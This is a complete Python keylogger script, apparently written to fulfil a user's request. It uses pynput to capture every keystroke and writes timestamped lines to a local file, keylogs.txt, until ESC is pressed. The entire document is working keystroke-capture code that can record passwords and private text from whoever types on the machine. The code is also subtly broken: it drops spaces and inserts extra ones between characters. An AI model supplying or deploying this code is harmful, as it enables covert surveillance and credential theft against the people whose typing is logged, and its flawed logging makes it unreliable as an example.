#!/usr/bin/env python3
from pynput import keyboard
import datetime

log_file = "keylogs.txt"  # Log file name as requested
current_line = []

def on_press(key):
    global current_line
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = str(key).replace("'", "")
        
        if key == keyboard.Key.space:
            key_str = " "
        elif key == keyboard.Key.enter:
            # Write the accumulated line to file and reset
            with open(log_file, "a") as f:
                f.write(f"{timestamp} - {' '.join(current_line)}\n")
            current_line = []
            return
        elif key == keyboard.Key.backspace:
            if current_line:  # Remove last character if exists
                current_line.pop()
            return
        else:
            current_line.append(key_str)
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - Error: {str(e)}\n")

def on_release(key):
    # Stop with ESC
    if key == keyboard.Key.esc:
        if current_line:  # Write any remaining input before stopping
            with open(log_file, "a") as f:
                f.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {' '.join(current_line)}\n")
        return False

# Start the keylogger
print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
